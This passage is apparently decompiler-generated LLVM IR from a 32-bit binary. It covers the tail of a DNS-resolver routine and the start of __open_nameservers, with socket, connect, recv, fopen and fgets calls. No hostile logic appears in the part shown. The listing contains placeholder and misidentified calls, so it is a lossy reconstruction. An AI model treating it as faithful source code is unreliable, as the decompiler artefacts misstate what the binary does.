  %v1_804f260 = add i32 %v1_804f267, 51
  %v2_804f260 = inttoptr i32 %v1_804f260 to i8*
  %v3_804f260 = load i8, i8* %v2_804f260, align 1
  %v4_804f260 = icmp eq i8 %v3_804f260, 0
  %v1_804f265 = icmp eq i1 %v4_804f260, false
  br i1 %v1_804f265, label %dec_label_pc_804f2ab, label %dec_label_pc_804f267

dec_label_pc_804f267:                             ; preds = %dec_label_pc_804f260
  %v0_804f267 = load i32, i32* @ecx, align 4
  %v2_804f267 = add i32 %v1_804f267, -4
  %v3_804f267 = inttoptr i32 %v2_804f267 to i32*
  store i32 %v0_804f267, i32* %v3_804f267, align 4
  %v1_804f268 = add i32 %v1_804f267, -8
  %v2_804f268 = inttoptr i32 %v1_804f268 to i32*
  store i32 ptrtoint (i32* @global_var_8054330.338 to i32), i32* %v2_804f268, align 4
  %v1_804f26d = add i32 %v1_804f267, -12
  %v2_804f26d = inttoptr i32 %v1_804f26d to i32*
  store i32 134534955, i32* %v2_804f26d, align 4
  %v1_804f272 = add i32 %v1_804f267, 184
  store i32 %v1_804f272, i32* @esi, align 4
  %v2_804f279 = add i32 %v1_804f267, -16
  %v3_804f279 = inttoptr i32 %v2_804f279 to i32*
  store i32 %v1_804f272, i32* %v3_804f279, align 4
  %v2_804f27a = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ecec)
  store i32 %v2_804f27a, i32* %eax.global-to-local, align 4
  %v0_804f27f = load i32, i32* @esp, align 4
  %v1_804f27f = inttoptr i32 %v0_804f27f to i32*
  store i32 ptrtoint (i32* @global_var_8054330.338 to i32), i32* %v1_804f27f, align 4
  %v1_804f286 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804f286, i32* %eax.global-to-local, align 4
  %v0_804f28b = load i32, i32* @esp, align 4
  %v1_804f28b = inttoptr i32 %v0_804f28b to i32*
  %v2_804f28b = load i32, i32* %v1_804f28b, align 4
  store i32 %v2_804f28b, i32* @eax, align 4
  %v3_804f28b = add i32 %v0_804f28b, 4
  %v1_804f28c = inttoptr i32 %v3_804f28b to i32*
  %v2_804f28c = load i32, i32* %v1_804f28c, align 4
  store i32 %v2_804f28c, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804f28c, align 4
  %v0_804f28f = load i32, i32* @esi, align 4
  store i32 %v0_804f28f, i32* %v1_804f28b, align 4
  %v0_804f290 = load i32, i32* @global_var_8056dd8.401, align 8
  store i32 %v0_804f290, i32* %ebx.global-to-local, align 4
  %v2_804f296 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ecec)
  store i32 %v2_804f296, i32* %eax.global-to-local, align 4
  %v0_804f29b = load i32, i32* @esp, align 4
  %v1_804f29b = add i32 %v0_804f29b, 16
  %v1_804f29e = add i32 %v0_804f290, -1
  store i32 %v1_804f29e, i32* @ebx, align 4
  %v1_804f29f = add i32 %v0_804f29b, 52
  %v2_804f29f = inttoptr i32 %v1_804f29f to i32*
  %v3_804f29f = load i32, i32* %v2_804f29f, align 4
  %v5_804f29f = sub i32 %v3_804f29f, %v1_804f29e
  %v11_804f29f = xor i32 %v3_804f29f, %v1_804f29e
  %v12_804f29f = xor i32 %v5_804f29f, %v3_804f29f
  %v13_804f29f = and i32 %v12_804f29f, %v11_804f29f
  %v14_804f29f = icmp slt i32 %v13_804f29f, 0
  %v16_804f29f = icmp slt i32 %v5_804f29f, 0
  %v2_804f2a3 = icmp eq i1 %v16_804f29f, %v14_804f29f
  br i1 %v2_804f2a3, label %dec_label_pc_804f2ab, label %dec_label_pc_804f2a5

dec_label_pc_804f2a5:                             ; preds = %dec_label_pc_804f267
  %v4_804f2a5 = add i32 %v3_804f29f, 1
  store i32 %v4_804f2a5, i32* %v2_804f29f, align 4
  br label %dec_label_pc_804f2cc.backedge

dec_label_pc_804f2ab:                             ; preds = %dec_label_pc_804ef34, %dec_label_pc_804f267, %dec_label_pc_804f260, %dec_label_pc_804ef4b
  %v1_804f2b8 = phi i32 [ %v1_804f29b, %dec_label_pc_804f267 ], [ %v1_804f267, %dec_label_pc_804f260 ], [ %v1_804ef87, %dec_label_pc_804ef4b ], [ %v0_804f2ab.pre, %dec_label_pc_804ef34 ]
  %v1_804f2ab = add i32 %v1_804f2b8, 40
  %v2_804f2ab = inttoptr i32 %v1_804f2ab to i32*
  %v3_804f2ab = load i32, i32* %v2_804f2ab, align 4
  %v1_804f2af = add i32 %v3_804f2ab, 1
  store i32 %v1_804f2af, i32* %eax.global-to-local, align 4
  %v1_804f2b0 = ashr i32 %v1_804f2af, 31
  store i32 %v1_804f2b0, i32* %edx.global-to-local, align 4
  %v1_804f2b1 = add i32 %v1_804f2b8, 248
  %v2_804f2b1 = inttoptr i32 %v1_804f2b1 to i32*
  %v3_804f2b1 = load i32, i32* %v2_804f2b1, align 4
  %v5_804f2b1 = zext i32 %v1_804f2af to i64
  %v7_804f2b1 = zext i32 %v1_804f2b0 to i64
  %v8_804f2b1 = mul nuw i64 %v7_804f2b1, 4294967296
  %v9_804f2b1 = or i64 %v8_804f2b1, %v5_804f2b1
  %v10_804f2b1 = zext i32 %v3_804f2b1 to i64
  %v11_804f2b1 = sdiv i64 %v9_804f2b1, %v10_804f2b1
  %v12_804f2b1 = trunc i64 %v11_804f2b1 to i32
  store i32 %v12_804f2b1, i32* %eax.global-to-local, align 4
  %v13_804f2b1 = srem i64 %v9_804f2b1, %v10_804f2b1
  %v14_804f2b1 = trunc i64 %v13_804f2b1 to i32
  store i32 %v14_804f2b1, i32* %edx.global-to-local, align 4
  store i32 %v14_804f2b1, i32* %v2_804f2ab, align 4
  %v1_804f2bc = icmp eq i32 %v14_804f2b1, 0
  %v1_804f2be = icmp eq i1 %v1_804f2bc, false
  br i1 %v1_804f2be, label %dec_label_pc_804f2c4, label %dec_label_pc_804f2c0

dec_label_pc_804f2c0:                             ; preds = %dec_label_pc_804f2ab
  %v0_804f2c0 = load i32, i32* @esp, align 4
  %v1_804f2c0 = add i32 %v0_804f2c0, 28
  %v2_804f2c0 = inttoptr i32 %v1_804f2c0 to i32*
  %v3_804f2c0 = load i32, i32* %v2_804f2c0, align 4
  %v4_804f2c0 = add i32 %v3_804f2c0, 1
  store i32 %v4_804f2c0, i32* %v2_804f2c0, align 4
  br label %dec_label_pc_804f2c4

dec_label_pc_804f2c4:                             ; preds = %dec_label_pc_804f2ab, %dec_label_pc_804f2c0
  %v0_804f2c4 = load i32, i32* @esp, align 4
  %v1_804f2c4 = add i32 %v0_804f2c4, 36
  %v2_804f2c4 = inttoptr i32 %v1_804f2c4 to i32*
  store i32 -1, i32* %v2_804f2c4, align 4
  br label %dec_label_pc_804f2cc.backedge

dec_label_pc_804f2cc.backedge:                    ; preds = %dec_label_pc_804f2c4, %dec_label_pc_804ef42, %dec_label_pc_804f030, %dec_label_pc_804f2a5
  %v0_804f2cc.pre = load i32, i32* @esp, align 4
  %v1_804f2cc = add i32 %v0_804f2cc.pre, 28
  %v2_804f2cc = inttoptr i32 %v1_804f2cc to i32*
  %v3_804f2cc = load i32, i32* %v2_804f2cc, align 4
  %tmp120 = icmp ult i32 %v3_804f2cc, 3
  br i1 %tmp120, label %dec_label_pc_804ed2c, label %dec_label_pc_804f2f1

dec_label_pc_804f2f1:                             ; preds = %dec_label_pc_804eca6, %dec_label_pc_804ed42, %dec_label_pc_804ee36, %dec_label_pc_804f2cc.backedge, %entry, %dec_label_pc_804ec80, %dec_label_pc_804ec88, %dec_label_pc_804ec96
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_804ec96 ], [ -1, %dec_label_pc_804ec88 ], [ -1, %dec_label_pc_804ec80 ], [ -1, %entry ], [ %v0_804ecf3, %dec_label_pc_804f2cc.backedge ], [ %v0_804ecf3, %dec_label_pc_804ee36 ], [ %v0_804ecf3, %dec_label_pc_804ed42 ], [ %v0_804ecf3, %dec_label_pc_804eca6 ]
  %v0_804f2f1 = call i32 @__GI___h_errno_location()
  store i32 %v0_804f2f1, i32* %eax.global-to-local, align 4
  %v1_804f2f6 = inttoptr i32 %v0_804f2f1 to i32*
  store i32 -1, i32* %v1_804f2f6, align 4
  %v0_804f2fc = load i32, i32* @esp, align 4
  %v1_804f2fc = add i32 %v0_804f2fc, 44
  %v2_804f2fc = inttoptr i32 %v1_804f2fc to i32*
  %v3_804f2fc = load i32, i32* %v2_804f2fc, align 4
  store i32 %v3_804f2fc, i32* %eax.global-to-local, align 4
  %v2_804f300 = add i32 %v0_804f2fc, 56
  %v3_804f300 = inttoptr i32 %v2_804f300 to i32*
  store i32 %v3_804f2fc, i32* %v3_804f300, align 4
  br label %dec_label_pc_804f304

dec_label_pc_804f304:                             ; preds = %dec_label_pc_804f069, %dec_label_pc_804f041, %dec_label_pc_804f2f1
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_804f2f1 ], [ %v0_804ecf3, %dec_label_pc_804f069 ], [ %v0_804ecf3, %dec_label_pc_804f041 ]
  %v0_804f304 = load i32, i32* @esp, align 4
  %v1_804f304 = add i32 %v0_804f304, 20
  %v2_804f304 = inttoptr i32 %v1_804f304 to i32*
  %v3_804f304 = load i32, i32* %v2_804f304, align 4
  %v13_804f304 = icmp eq i32 %v3_804f304, -1
  br i1 %v13_804f304, label %dec_label_pc_804f304.dec_label_pc_804f31a_crit_edge, label %dec_label_pc_804f30b

dec_label_pc_804f304.dec_label_pc_804f31a_crit_edge: ; preds = %dec_label_pc_804f304
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_804f31a

dec_label_pc_804f30b:                             ; preds = %dec_label_pc_804f304
  %v3_804f30e = load i32, i32* %v2_804f304, align 4
  %v5_804f30e = add i32 %v0_804f304, -16
  %v6_804f30e = inttoptr i32 %v5_804f30e to i32*
  store i32 %v3_804f30e, i32* %v6_804f30e, align 4
  %v1_804f312 = sext i16 %stack_var_-192.1 to i32
  %v2_804f312 = call i32 @__libc_close(i32 %v1_804f312)
  store i32 %v2_804f312, i32* %eax.global-to-local, align 4
  %v0_804f317 = load i32, i32* @esp, align 4
  %v1_804f317 = add i32 %v0_804f317, 16
  br label %dec_label_pc_804f31a

dec_label_pc_804f31a:                             ; preds = %dec_label_pc_804f304.dec_label_pc_804f31a_crit_edge, %dec_label_pc_804f30b
  %v1_804f321.pre-phi = phi i32 [ %.pre, %dec_label_pc_804f304.dec_label_pc_804f31a_crit_edge ], [ %v1_804f312, %dec_label_pc_804f30b ]
  %v0_804f31a = phi i32 [ %v0_804f304, %dec_label_pc_804f304.dec_label_pc_804f31a_crit_edge ], [ %v1_804f317, %dec_label_pc_804f30b ]
  %v1_804f31d = add i32 %v0_804f31a, 12
  %v2_804f31d = inttoptr i32 %v1_804f31d to i32*
  %v3_804f31d = load i32, i32* %v2_804f31d, align 4
  %v5_804f31d = add i32 %v0_804f31a, -16
  %v6_804f31d = inttoptr i32 %v5_804f31d to i32*
  store i32 %v3_804f31d, i32* %v6_804f31d, align 4
  %v2_804f321 = call i32 @free(i32 %v1_804f321.pre-phi)
  store i32 %v2_804f321, i32* %eax.global-to-local, align 4
  %v1_804f326 = load i32, i32* @esp, align 4
  %v2_804f326 = inttoptr i32 %v1_804f326 to i32*
  store i32 %v2_804ec5e, i32* %v2_804f326, align 4
  %v2_804f329 = call i32 @free(i32 %v1_804f321.pre-phi)
  store i32 %v2_804f329, i32* @eax, align 4
  %v0_804f32e = load i32, i32* @esp, align 4
  %v1_804f331 = add i32 %v0_804f32e, 32
  %v2_804f331 = inttoptr i32 %v1_804f331 to i32*
  store i32 -1, i32* %v2_804f331, align 4
  %v0_804f339 = load i32, i32* @esp, align 4
  %v1_804f339 = add i32 %v0_804f339, 40
  %v2_804f339 = inttoptr i32 %v1_804f339 to i32*
  %v3_804f339 = load i32, i32* %v2_804f339, align 4
  %v13_804f339 = icmp eq i32 %v3_804f339, -1
  br i1 %v13_804f339, label %dec_label_pc_804f38d, label %dec_label_pc_804f340

dec_label_pc_804f340:                             ; preds = %dec_label_pc_804f31a
  %v0_804f340 = load i32, i32* @ecx, align 4
  %v2_804f340 = add i32 %v0_804f339, -4
  %v3_804f340 = inttoptr i32 %v2_804f340 to i32*
  store i32 %v0_804f340, i32* %v3_804f340, align 4
  %v1_804f341 = add i32 %v0_804f339, -8
  %v2_804f341 = inttoptr i32 %v1_804f341 to i32*
  store i32 ptrtoint (i8** @global_var_80569e8.398 to i32), i32* %v2_804f341, align 4
  %v1_804f346 = add i32 %v0_804f339, -12
  %v2_804f346 = inttoptr i32 %v1_804f346 to i32*
  store i32 134534955, i32* %v2_804f346, align 4
  %v1_804f34b = add i32 %v0_804f339, 184
  store i32 %v1_804f34b, i32* %ebx.global-to-local, align 4
  %v2_804f352 = add i32 %v0_804f339, -16
  %v3_804f352 = inttoptr i32 %v2_804f352 to i32*
  store i32 %v1_804f34b, i32* %v3_804f352, align 4
  %v3_804f353 = call i32 @__pthread_return_void(i32 %v1_804f321.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f353, i32* %eax.global-to-local, align 4
  %v0_804f358 = load i32, i32* @esp, align 4
  %v1_804f358 = inttoptr i32 %v0_804f358 to i32*
  store i32 ptrtoint (i8** @global_var_80569e8.398 to i32), i32* %v1_804f358, align 4
  %v2_804f35f = call i32 @__pthread_return_0(i32 %v1_804f321.pre-phi)
  store i32 %v2_804f35f, i32* %eax.global-to-local, align 4
  %v0_804f364 = load i32, i32* @esp, align 4
  %v1_804f364 = add i32 %v0_804f364, 56
  %v2_804f364 = inttoptr i32 %v1_804f364 to i32*
  %v3_804f364 = load i32, i32* %v2_804f364, align 4
  store i32 %v3_804f364, i32* %edx.global-to-local, align 4
  %v1_804f368 = add i32 %v0_804f364, 72
  %v2_804f368 = inttoptr i32 %v1_804f368 to i32*
  %v3_804f368 = load i32, i32* %v2_804f368, align 4
  store i32 %v3_804f368, i32* %eax.global-to-local, align 4
  %v1_804f36c = sext i32 %v3_804f364 to i64
  store i64 %v1_804f36c, i64* @global_var_8056a00.399, align 512
  %v1_804f372 = trunc i32 %v3_804f368 to i16
  store i16 %v1_804f372, i16* @global_var_805432c.400, align 4
  %v1_804f378 = inttoptr i32 %v0_804f364 to i32*
  %v2_804f378 = load i32, i32* %v1_804f378, align 4
  store i32 %v2_804f378, i32* @eax, align 4
  %v3_804f378 = add i32 %v0_804f364, 4
  %v1_804f379 = inttoptr i32 %v3_804f378 to i32*
  %v2_804f379 = load i32, i32* %v1_804f379, align 4
  store i32 %v2_804f379, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804f379, align 4
  %v0_804f37c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f37c, i32* %v1_804f378, align 4
  %v3_804f37d = call i32 @__pthread_return_void(i32 %v1_804f321.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f37d, i32* %eax.global-to-local, align 4
  %v0_804f382 = load i32, i32* @esp, align 4
  %v1_804f382 = add i32 %v0_804f382, 32
  %v2_804f382 = inttoptr i32 %v1_804f382 to i32*
  store i32 -1, i32* %v2_804f382, align 4
  br label %dec_label_pc_804f38a

dec_label_pc_804f38a:                             ; preds = %dec_label_pc_804f1fe, %dec_label_pc_804f340
  %v0_804f38a = load i32, i32* @esp, align 4
  %v1_804f38a = add i32 %v0_804f38a, 16
  br label %dec_label_pc_804f38d

dec_label_pc_804f38d:                             ; preds = %dec_label_pc_804f31a, %dec_label_pc_804f38a
  %v0_804f38d = phi i32 [ %v0_804f339, %dec_label_pc_804f31a ], [ %v1_804f38a, %dec_label_pc_804f38a ]
  %v1_804f38d = add i32 %v0_804f38d, 16
  %v2_804f38d = inttoptr i32 %v1_804f38d to i32*
  %v3_804f38d = load i32, i32* %v2_804f38d, align 4
  store i32 %v3_804f38d, i32* %eax.global-to-local, align 4
  %v1_804f391 = add i32 %v0_804f38d, 220
  %v1_804f397 = inttoptr i32 %v1_804f391 to i32*
  %v2_804f397 = load i32, i32* %v1_804f397, align 4
  store i32 %v2_804f397, i32* @ebx, align 4
  %v3_804f397 = add i32 %v0_804f38d, 224
  %v1_804f398 = inttoptr i32 %v3_804f397 to i32*
  %v2_804f398 = load i32, i32* %v1_804f398, align 4
  store i32 %v2_804f398, i32* @esi, align 4
  %v3_804f398 = add i32 %v0_804f38d, 228
  %v1_804f399 = inttoptr i32 %v3_804f398 to i32*
  %v2_804f399 = load i32, i32* %v1_804f399, align 4
  store i32 %v2_804f399, i32* @edi, align 4
  %v3_804f399 = add i32 %v0_804f38d, 232
  %v1_804f39a = inttoptr i32 %v3_804f399 to i32*
  %v2_804f39a = load i32, i32* %v1_804f39a, align 4
  store i32 %v2_804f39a, i32* @ebp, align 4
  ret i32 %v3_804f38d

; uselistorder directives
  uselistorder i32 %v0_804f38d, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804f364, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f339, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_804f31a, { 1, 0 }
  uselistorder i32 %v1_804f321.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_804f2cc.pre, { 1, 0 }
  uselistorder i32 %v5_804f29f, { 1, 0 }
  uselistorder i32 %v3_804f29f, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804f267, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_804f230, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f1fe, { 1, 0 }
  uselistorder i32 %v3_804f1dd, { 1, 0, 2 }
  uselistorder i32 %v0_804f1ce, { 1, 0 }
  uselistorder i32 %v5_804f1c4, { 1, 0 }
  uselistorder i32* %v3_804f1c4, { 1, 0 }
  uselistorder i32 %v0_804f09a81, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_804f1c4, { 2, 1, 0 }
  uselistorder i32 %v5_804f1be, { 1, 0 }
  uselistorder i32 %v1_804f1bd, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804f1b9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804f17d, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_804f157, { 1, 0 }
  uselistorder i32 %v1_804f148, { 1, 0 }
  uselistorder i32 %v0_804f107, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_804f0ae, { 1, 2, 0 }
  uselistorder i32 %v0_804f0ae, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_804f088, { 1, 0 }
  uselistorder i32 %v1_804f082, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804f07d, { 1, 2, 0 }
  uselistorder i32 %v5_804f08858, { 1, 0 }
  uselistorder i32 %v5_804f02a, { 1, 0 }
  uselistorder i32 %v3_804f02a, { 2, 0, 1, 3 }
  uselistorder i32 %v3_804efe2, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804efc8, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_804efc8, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_804efa7, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804ef87, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804ef2d, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_804ef12, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_804eefb, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804ee83, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804ee70, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804ee36, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804ee17, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804edfb, { 1, 0 }
  uselistorder i32 %v3_804edf0, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_804eded, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_804ed92, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_804ed8d, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804ed76, { 1, 0 }
  uselistorder i32 %v1_804ed42, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804ed3392, { 2, 1, 0 }
  uselistorder i32 %v3_804ed4b, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i16 %v0_804ecf3, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_804ecec, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_804ec5e, { 1, 5, 4, 8, 9, 2, 10, 7, 0, 3, 11, 6, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 78, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66, 62, 63, 64, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 68, { 3, 0, 2, 4, 5, 1 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 72, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 2, 1 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 4, 3, 2, 1 }
  uselistorder i32 17, { 15, 14, 8, 13, 4, 5, 3, 9, 10, 11, 12, 0, 16, 7, 2, 1, 6 }
  uselistorder i32 176, { 1, 2, 3, 0 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 2, 3, 4, 0, 1 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 84, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 -12, { 10, 4, 3, 5, 2, 6, 7, 8, 9, 35, 11, 32, 33, 34, 17, 18, 12, 13, 14, 15, 16, 19, 20, 0, 21, 24, 23, 25, 26, 27, 28, 22, 1, 29, 30, 31 }
  uselistorder i32 -8, { 12, 6, 5, 7, 4, 8, 9, 10, 11, 13, 37, 30, 33, 31, 34, 35, 36, 32, 19, 20, 14, 15, 16, 17, 18, 21, 22, 23, 24, 0, 1, 2, 26, 25, 3, 27, 28, 29 }
  uselistorder i32 (i32)* @__libc_close, { 2, 1, 0, 3, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 -16, { 18, 19, 20, 9, 11, 12, 8, 10, 7, 13, 6, 14, 15, 16, 17, 21, 49, 50, 27, 28, 22, 23, 24, 25, 26, 29, 30, 4, 31, 32, 1, 37, 0, 36, 2, 38, 3, 39, 40, 41, 33, 34, 35, 42, 5, 43, 47, 44, 45, 46, 48 }
  uselistorder i16* @global_var_805432c.400, { 2, 1, 0 }
  uselistorder i64 4294967295, { 3, 2, 0, 1 }
  uselistorder i64* @global_var_8056a00.399, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80569e8.398 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_80569e8.398, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804f38d, { 1, 0 }
  uselistorder label %dec_label_pc_804f38a, { 1, 0 }
  uselistorder label %dec_label_pc_804f31a, { 1, 0 }
  uselistorder label %dec_label_pc_804f304, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f2f1, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_804f2cc.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804f2c4, { 1, 0 }
  uselistorder label %dec_label_pc_804f2ab, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804f260, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_804f1fe, { 1, 0 }
  uselistorder label %dec_label_pc_804f1ce, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_804f1c4, { 1, 0 }
  uselistorder label %dec_label_pc_804f1b9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f1b6, { 1, 0 }
  uselistorder label %dec_label_pc_804f131, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f079, { 1, 0 }
  uselistorder label %dec_label_pc_804eefb, { 1, 0 }
  uselistorder label %dec_label_pc_804eec4, { 1, 0 }
  uselistorder label %dec_label_pc_804ee36, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ed42, { 1, 0 }
  uselistorder label %dec_label_pc_804ed2c, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_804f39c = load i32, i32* @ebp, align 4
  store i32 134534955, i32* %stack_var_-216, align 4
  %v3_804f3ab = ptrtoint i32* %stack_var_-216 to i32
  %v2_804f3b0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f3b0, i32* @eax, align 4
  %v2_804f3b8 = call i32 @__pthread_return_void(i32 %v2_804f3b0, i32 134534955)
  %v1_804f3c4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054330.338 to i32))
  store i32 %v1_804f3c4, i32* @eax, align 4
  %v0_804f3cc = load i32, i32* @global_var_8056dd4.339, align 4
  %tmp43 = icmp slt i32 %v0_804f3cc, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_804f5c3, label %dec_label_pc_804f3d9

dec_label_pc_804f3d9:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_8052b90.403 to i32), i32* %stack_var_-216, align 4
  %v2_804f3e5 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_8052b5e.404 to i32), i32 ptrtoint (i32* @global_var_8052b90.403 to i32))
  store i32 %v2_804f3e5, i32* @eax, align 4
  store i32 %v2_804f3e5, i32* @ebp, align 4
  %v1_804f3ef = icmp eq i32 %v2_804f3e5, 0
  %v1_804f3f1 = icmp eq i1 %v1_804f3ef, false
  br i1 %v1_804f3f1, label %dec_label_pc_804f58e.preheader, label %dec_label_pc_804f3f7

dec_label_pc_804f3f7:                             ; preds = %dec_label_pc_804f3d9
  store i32 ptrtoint (i32* @global_var_8052b90.403 to i32), i32* %stack_var_-216, align 4
  %v2_804f403 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_8052b6f.405 to i32), i32 ptrtoint (i32* @global_var_8052b90.403 to i32))
  store i32 %v2_804f403, i32* @ebp, align 4
  %v1_804f40d = icmp eq i32 %v2_804f403, 0
  %v1_804f40f = icmp eq i1 %v1_804f40d, false
  br i1 %v1_804f40f, label %dec_label_pc_804f58e.preheader, label %dec_label_pc_804f5b8

dec_label_pc_804f58e.preheader:                   ; preds = %dec_label_pc_804f3d9, %dec_label_pc_804f3f7
  %v2_804f595 = ptrtoint i32* %stack_var_-180 to i32
  %v3_804f4c9 = add i32 %v3_804f3ab, 164
  %v0_804f58e103 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_804f595, i32* @ebx, align 4
  %v3_804f59a104 = call i32 @fgets(i32 %v2_804f595, i32 128, i32 %v0_804f58e103)
  store i32 %v3_804f59a104, i32* @eax, align 4
  %v1_804f5a2105 = icmp eq i32 %v3_804f59a104, 0
  %v1_804f5a4106 = icmp eq i1 %v1_804f5a2105, false
  br i1 %v1_804f5a4106, label %dec_label_pc_804f41b.preheader.lr.ph, label %dec_label_pc_804f5aa

dec_label_pc_804f41b.preheader.lr.ph:             ; preds = %dec_label_pc_804f58e.preheader
  %v4_804f4b3 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_804f41b.preheader

dec_label_pc_804f41a:                             ; preds = %dec_label_pc_804f425
  %v1_804f41a = add i32 %v0_804f41a57, 1
  store i32 %v1_804f41a, i32* @ebx, align 4
  %v1_804f41b = inttoptr i32 %v1_804f41a to i8*
  %v2_804f41b = load i8, i8* %v1_804f41b, align 1
  %v3_804f41b = zext i8 %v2_804f41b to i32
  %v5_804f41b = and i32 %v6_804f41b60, -256
  %v6_804f41b = or i32 %v3_804f41b, %v5_804f41b
  store i32 %v6_804f41b, i32* @ecx, align 4
  %v4_804f41d = icmp eq i8 %v2_804f41b, 0
  br i1 %v4_804f41d, label %dec_label_pc_804f58e.backedge, label %dec_label_pc_804f425

dec_label_pc_804f425:                             ; preds = %dec_label_pc_804f425.lr.ph, %dec_label_pc_804f41a
